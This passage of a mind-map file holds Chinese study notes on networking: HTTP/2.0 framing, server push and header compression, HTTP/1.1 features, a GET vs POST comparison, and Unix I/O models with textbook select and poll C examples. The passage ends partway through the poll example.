        客户端需要使用多个连接才能实现并发和缩短延迟；
      </li>
      <li>
        不会压缩请求和响应首部，从而导致不必要的网络流量；
      </li>
      <li>
        不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_457453350" CREATED="1754750475309" MODIFIED="1754750475311"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二进制分帧层
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二进制分帧层" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#二进制分帧层">
</a>
    <p dir="auto">
      HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a8a0dee9a0f9442c3f50cb75099b650c6043382f82ea95c7250ed421982cdcab/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38366536613931642d613238352d343437612d393334352d6335343834623864306334372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/a8a0dee9a0f9442c3f50cb75099b650c6043382f82ea95c7250ed421982cdcab/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38366536613931642d613238352d343437612d393334352d6335343834623864306334372e706e67" width="400" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/86e6a91d-a285-447a-9345-c5484b8d0c47.png"/>
    </a><br/>
    

    <p dir="auto">
      在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。
    </p>
    <ul dir="auto">
      <li>
        一个数据流（Stream）都有一个唯一标识符和可选的优先级信息，用于承载双向信息。
      </li>
      <li>
        消息（Message）是与逻辑请求或响应对应的完整的一系列帧。
      </li>
      <li>
        帧（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/a919b9410136a3a6d9f32ba192964b8460cb596dacc05d1b19692d0c82a7cef3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61663139386461312d323438302d343034332d623037662d6133623931613838623831352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/a919b9410136a3a6d9f32ba192964b8460cb596dacc05d1b19692d0c82a7cef3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f61663139386461312d323438302d343034332d623037662d6133623931613838623831352e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af198da1-2480-4043-b07f-a3b91a88b815.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1137673392" CREATED="1754750475311" MODIFIED="1754750475313"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      服务端推送
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 服务端推送" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#服务端推送">
</a>
    <p dir="auto">
      HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4f905cf7ee5ff935f11c116d06973c275cf8d27cd6ed25313b6ec7540fad89e3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65336631363537632d383066632d346466612d393634332d6266353161626432303163362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/4f905cf7ee5ff935f11c116d06973c275cf8d27cd6ed25313b6ec7540fad89e3/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f65336631363537632d383066632d346466612d393634332d6266353161626432303163362e706e67" width="800" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e3f1657c-80fc-4dfa-9643-bf51abd201c6.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1669216867" CREATED="1754750475314" MODIFIED="1754750475316"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      首部压缩
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 首部压缩" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#首部压缩">
</a>
    <p dir="auto">
      HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。
    </p>
    <p dir="auto">
      HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。
    </p>
    <p dir="auto">
      不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5c6a06274345299b1f2d9fe4023e6548e8defcc4bea9c51eb6d3a54a2bb1d2a2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f5f75344530425f75384637442e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5c6a06274345299b1f2d9fe4023e6548e8defcc4bea9c51eb6d3a54a2bb1d2a2/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f5f75344530425f75384637442e706e67" width="600" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/_u4E0B_u8F7D.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1803813969" CREATED="1754750475316" MODIFIED="1754750475318"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      八、HTTP/1.1 新特性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 八、HTTP/1.1 新特性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#八http11-新特性">
</a>
    <p dir="auto">
      详细内容请见上文
    </p>
    <ul dir="auto">
      <li>
        默认是长连接
      </li>
      <li>
        支持流水线
      </li>
      <li>
        支持同时打开多个 TCP 连接
      </li>
      <li>
        支持虚拟主机
      </li>
      <li>
        新增状态码 100
      </li>
      <li>
        支持分块传输编码
      </li>
      <li>
        新增缓存处理指令 max-age
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node FOLDED="true" ID="ID_1862139037" CREATED="1754750475318" MODIFIED="1754750475318"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      九、GET 和 POST 比较
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1095405733" CREATED="1754750475323" MODIFIED="1754750475324"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      作用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 作用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#作用">
</a>
    <p dir="auto">
      GET 用于获取资源，而 POST 用于传输实体主体。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1498495302" CREATED="1754750475325" MODIFIED="1754750475327"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参数" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#参数">
</a>
    <p dir="auto">
      GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。
    </p>
    <p dir="auto">
      因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码。例如 <code>中文</code>&#xa0;会转换为 <code>%E4%B8%AD%E6%96%87</code>，而空格会转换为 <code>%20</code>。POST 参数支持标准字符集。
    </p>
    <pre class="notranslate">GET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1</pre>
    <pre class="notranslate">POST /test/demo_form.asp HTTP/1.1
Host: w3schools.com
name1=value1&amp;name2=value2</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_788889945" CREATED="1754750475327" MODIFIED="1754750475329"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      安全
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 安全" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#安全">
</a>
    <p dir="auto">
      安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。
    </p>
    <p dir="auto">
      GET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。
    </p>
    <p dir="auto">
      安全的方法除了 GET 之外还有：HEAD、OPTIONS。
    </p>
    <p dir="auto">
      不安全的方法除了 POST 之外还有 PUT、DELETE。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_695077647" CREATED="1754750475329" MODIFIED="1754750475331"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      幂等性
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 幂等性" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#幂等性">
</a>
    <p dir="auto">
      幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。
    </p>
    <p dir="auto">
      所有的安全方法也都是幂等的。
    </p>
    <p dir="auto">
      在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。
    </p>
    <p dir="auto">
      GET /pageX HTTP/1.1 是幂等的，连续调用多次，客户端接收到的结果都是一样的：
    </p>
    <pre class="notranslate">GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1</pre>
    <p dir="auto">
      POST /add_row HTTP/1.1 不是幂等的，如果调用多次，就会增加多行记录：
    </p>
    <pre class="notranslate">POST /add_row HTTP/1.1   -&gt; Adds a 1nd row
POST /add_row HTTP/1.1   -&gt; Adds a 2nd row
POST /add_row HTTP/1.1   -&gt; Adds a 3rd row</pre>
    <p dir="auto">
      DELETE /idX/delete HTTP/1.1 是幂等的，即使不同的请求接收到的状态码不一样：
    </p>
    <pre class="notranslate">DELETE /idX/delete HTTP/1.1   -&gt; Returns 200 if idX exists
DELETE /idX/delete HTTP/1.1   -&gt; Returns 404 as it just got deleted
DELETE /idX/delete HTTP/1.1   -&gt; Returns 404</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1569761202" CREATED="1754750475331" MODIFIED="1754750475335"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      可缓存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 可缓存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#可缓存">
</a>
    <p dir="auto">
      如果要对响应进行缓存，需要满足以下条件：
    </p>
    <ul dir="auto">
      <li>
        请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。
      </li>
      <li>
        响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。
      </li>
      <li>
        响应报文的 Cache-Control 首部字段没有指定不进行缓存。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1796177552" CREATED="1754750475335" MODIFIED="1754750475337"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      XMLHttpRequest
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: XMLHttpRequest" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#xmlhttprequest">
</a>
    <p dir="auto">
      为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：
    </p>
    <blockquote>
      <p dir="auto">
        XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。
      </p>
    </blockquote>
    <ul dir="auto">
      <li>
        在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。
      </li>
      <li>
        而 GET 方法 Header 和 Data 会一起发送。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node ID="ID_1309257339" CREATED="1754750475337" MODIFIED="1754750475339"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/HTTP.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014.
      </li>
      <li>
        <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP" rel="nofollow">MDN : HTTP</a>
      </li>
      <li>
        <a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" rel="nofollow">HTTP/2 简介</a>
      </li>
      <li>
        <a href="http://php.net/manual/zh/function.htmlspecialchars.php" rel="nofollow">htmlspecialchars</a>
      </li>
      <li>
        <a href="http://java2db.com/java-io/how-to-get-and-the-difference-between-file-uri-and-url-in-java" rel="nofollow">Difference between file URI and URL in java</a>
      </li>
      <li>
        <a href="https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-using-prepared-callable-statement" rel="nofollow">How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement</a>
      </li>
      <li>
        <a href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html" rel="nofollow">浅谈 HTTP 中 Get 与 Post 的区别</a>
      </li>
      <li>
        <a href="https://www.webdancers.com/are-http-and-www-necesary/" rel="nofollow">Are http:// and www really necessary?</a>
      </li>
      <li>
        <a href="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html" rel="nofollow">HTTP (HyperText Transfer Protocol)</a>
      </li>
      <li>
        <a href="https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/" rel="nofollow">Web-VPN: Secure Proxies with SPDY &amp; Chrome</a>
      </li>
      <li>
        <a href="http://en.wikipedia.org/wiki/File:HTTP_persistent_connection.svg" rel="nofollow">File:HTTP persistent connection.svg</a>
      </li>
      <li>
        <a href="https://en.wikipedia.org/wiki/Proxy_server" rel="nofollow">Proxy server</a>
      </li>
      <li>
        <a href="https://www.x-cart.com/blog/what-is-https-and-ssl.html" rel="nofollow">What Is This HTTPS/SSL Thing And Why Should You Care?</a>
      </li>
      <li>
        <a href="https://securebox.comodo.com/ssl-sniffing/ssl-offloading/" rel="nofollow">What is SSL Offloading?</a>
      </li>
      <li>
        <a href="https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html" rel="nofollow">Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption</a>
      </li>
      <li>
        <a href="https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication" rel="nofollow">An Introduction to Mutual SSL Authentication</a>
      </li>
      <li>
        <a href="https://danielmiessler.com/study/url-uri/" rel="nofollow">The Difference Between URLs and URIs</a>
      </li>
      <li>
        <a href="https://juejin.im/entry/5766c29d6be3ff006a31b84e#comment" rel="nofollow">Cookie 与 Session 的区别</a>
      </li>
      <li>
        <a href="https://www.zhihu.com/question/19786827" rel="nofollow">COOKIE 和 SESSION 有什么区别</a>
      </li>
      <li>
        <a href="https://harttle.land/2015/08/10/cookie-session.html" rel="nofollow">Cookie/Session 的机制与安全</a>
      </li>
      <li>
        <a href="https://shijianan.com/2017/06/11/https/" rel="nofollow">HTTPS 证书原理</a>
      </li>
      <li>
        <a href="https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn" rel="nofollow">What is the difference between a URI, a URL and a URN?</a>
      </li>
      <li>
        <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" rel="nofollow">XMLHttpRequest</a>
      </li>
      <li>
        <a href="https://blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/" rel="nofollow">XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?</a>
      </li>
      <li>
        <a href="https://www.ssl2buy.com/wiki/symmetric-vs-asymmetric-encryption-what-are-differences" rel="nofollow">Symmetric vs. Asymmetric Encryption – What are differences?</a>
      </li>
      <li>
        <a href="https://www.kancloud.cn/digest/web-performance-http2" rel="nofollow">Web 性能优化与 HTTP/2</a>
      </li>
      <li>
        <a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" rel="nofollow">HTTP/2 简介</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_232056634" CREATED="1754749804456" MODIFIED="1754750538840" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Socket.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Socket
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_816698470" CREATED="1754750538842" MODIFIED="1754750538844"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、I/O 模型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      一个输入操作通常包括两个阶段：
    </p>
    <ul>
      <li>
        <p>
          等待数据准备好
        </p>
      </li>
      <li>
        <p>
          从内核向进程复制数据
        </p>
      </li>
    </ul>
    <p>
      对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。
    </p>
    <p>
      Unix 有五种 I/O 模型：
    </p>
    <ul>
      <li>
        <p>
          阻塞式 I/O
        </p>
      </li>
      <li>
        <p>
          非阻塞式 I/O
        </p>
      </li>
      <li>
        <p>
          I/O 复用（select 和 poll）
        </p>
      </li>
      <li>
        <p>
          信号驱动式 I/O（SIGIO）
        </p>
      </li>
      <li>
        <p>
          异步 I/O（AIO）
        </p>
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_518073375" CREATED="1754750538845" MODIFIED="1754750538847"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      阻塞式 I/O
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区中才返回。
    </p>
    <p>
      应该注意到，在阻塞的过程中，其它应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其它应用进程还可以执行，所以不消耗 CPU 时间，这种模型的 CPU 利用率会比较高。
    </p>
    <p>
      下图中，recvfrom() 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 buf 中。这里把 recvfrom() 当成系统调用。
    </p>
    <pre><code class="language-plaintext">ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);</code></pre>
    <p>
      <img src="https://camo.githubusercontent.com/2f896b81c0339c6ea7ab8ffbe9ba122fb084a069449c350a4687013620059d64/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f313439323932383431363831325f342e706e67"/>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1096040968" CREATED="1754750538847" MODIFIED="1754750538848"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      非阻塞式 I/O
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。
    </p>
    <p>
      由于 CPU 要处理更多的系统调用，因此这种模型的 CPU 利用率比较低。
    </p>
    <p>
      <img src="https://camo.githubusercontent.com/30acdded7b17645d8dd1f5cc2f75f0959a13fc4df7a7b759c29714d595b4d96d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f313439323932393030303336315f352e706e67"/>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1479028033" CREATED="1754750538849" MODIFIED="1754750538850"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      I/O 复用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      使用 select 或者 poll 等待数据，并且可以等待多个套接字中的任何一个变为可读。这一过程会被阻塞，当某一个套接字可读时返回，之后再使用 recvfrom 把数据从内核复制到进程中。
    </p>
    <p>
      它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 Event Driven I/O，即事件驱动 I/O。
    </p>
    <p>
      如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。
    </p>
    <p>
      <img src="https://camo.githubusercontent.com/604dc11458e119c59bb3b97d22c8eaeb9959d3c276822c4564ded24473df61dd/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f313439323932393434343831385f362e706e67"/>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_131857879" CREATED="1754750538851" MODIFIED="1754750538853"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      信号驱动 I/O
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      应用进程使用 sigaction 系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 recvfrom 将数据从内核复制到应用进程中。
    </p>
    <p>
      相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。
    </p>
    <p>
      <img src="https://camo.githubusercontent.com/316cb4882b82fb68a44291eb5763a84d800f134f765687544c60639be4927d24/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f313439323932393535333635315f372e706e67"/>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1566483278" CREATED="1754750538853" MODIFIED="1754750538855"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      异步 I/O
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      应用进程执行 aio_read 系统调用会立即返回，应用进程可以继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。
    </p>
    <p>
      异步 I/O 与信号驱动 I/O 的区别在于，异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。
    </p>
    <p>
      <img src="https://camo.githubusercontent.com/abeed5a41b9b8ab094d5361002c92eb004f9512d2b10b9ad293a0399fe2e9b56/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f313439323933303234333238365f382e706e67"/>
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_599885866" CREATED="1754750538856" MODIFIED="1754750538857"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      五大 I/O 模型比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <ul>
      <li>
        <p>
          同步 I/O：将数据从内核缓冲区复制到应用进程缓冲区的阶段（第二阶段），应用进程会阻塞。
        </p>
      </li>
      <li>
        <p>
          异步 I/O：第二阶段应用进程不会阻塞。
        </p>
      </li>
    </ul>
    <p>
      同步 I/O 包括阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O ，它们的主要区别在第一个阶段。
    </p>
    <p>
      非阻塞式 I/O 、信号驱动 I/O 和异步 I/O 在第一阶段不会阻塞。
    </p>
    <p>
      <img src="https://camo.githubusercontent.com/f941902253886d97b883a45cd991b8e189622cc7c8def49e292b1ea82d322f84/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f313439323932383130353739315f332e706e67"/>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_936497189" CREATED="1754750538858" MODIFIED="1754750538859"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、I/O 复用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      select/poll/epoll 都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。
    </p>
  </body>
</html></richcontent>
<node ID="ID_266765436" CREATED="1754750538860" MODIFIED="1754750538861"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      select
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre><code class="language-plaintext">int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);</code></pre>
    <p>
      select 允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成 I/O 操作。
    </p>
    <ul>
      <li>
        <p>
          fd_set 使用数组实现，数组大小使用 FD_SETSIZE 定义，所以只能监听少于 FD_SETSIZE 数量的描述符。有三种类型的描述符类型：readset、writeset、exceptset，分别对应读、写、异常条件的描述符集合。
        </p>
      </li>
      <li>
        <p>
          timeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 timeout。
        </p>
      </li>
      <li>
        <p>
          成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。
        </p>
      </li>
    </ul>
    <pre><code class="language-plaintext">fd_set fd_in, fd_out;
struct timeval tv;
// Reset the sets
FD_ZERO( &amp;fd_in );
FD_ZERO( &amp;fd_out );
// Monitor sock1 for input events
FD_SET( sock1, &amp;fd_in );
// Monitor sock2 for output events
FD_SET( sock2, &amp;fd_out );
// Find out which socket has the largest numeric value as select requires it
int largest_sock = sock1 &gt; sock2 ? sock1 : sock2;
// Wait up to 10 seconds
tv.tv_sec = 10;
tv.tv_usec = 0;
// Call the select
int ret = select( largest_sock + 1, &amp;fd_in, &amp;fd_out, NULL, &amp;tv );
// Check if select actually succeed
if ( ret == -1 )
    // report error and abort
else if ( ret == 0 )
    // timeout; no event detected
else
{
    if ( FD_ISSET( sock1, &amp;fd_in ) )
        // input event on sock1
    if ( FD_ISSET( sock2, &amp;fd_out ) )
        // output event on sock2
}</code></pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_568207818" CREATED="1754750538862" MODIFIED="1754750538863"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      poll
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <pre><code class="language-plaintext">int poll(struct pollfd *fds, unsigned int nfds, int timeout);</code></pre>
    <p>
      poll 的功能与 select 类似，也是等待一组描述符中的一个成为就绪状态。
    </p>
    <p>
      poll 中的描述符是 pollfd 类型的数组，pollfd 的定义如下：
    </p>
    <pre><code class="language-plaintext">struct pollfd {
               int   fd;         /* file descriptor */
               short events;     /* requested events */
               short revents;    /* returned events */
           };</code></pre>
    <pre><code class="language-plaintext">// The structure for two events
struct pollfd fds[2];
// Monitor sock1 for input
fds[0].fd = sock1;
fds[0].events = POLLIN;
// Monitor sock2 for output
fds[1].fd = sock2;
fds[1].events = POLLOUT;
// Wait 10 seconds
int ret = poll( &amp;fds, 2, 10000 );
// Check if poll actually succeed
if ( ret == -1 )
    // report error and abort
else if ( ret == 0 )
    // timeout; no event detected
else
{
    // If we detect the event, zero it out so we can reuse the structure
    if ( fds[0].revents &amp; POLLIN )
        fds[0].revents = 0;
        // input event on sock1
    if ( fds[1].revents &amp; POLLOUT )
        fds[1].revents = 0;
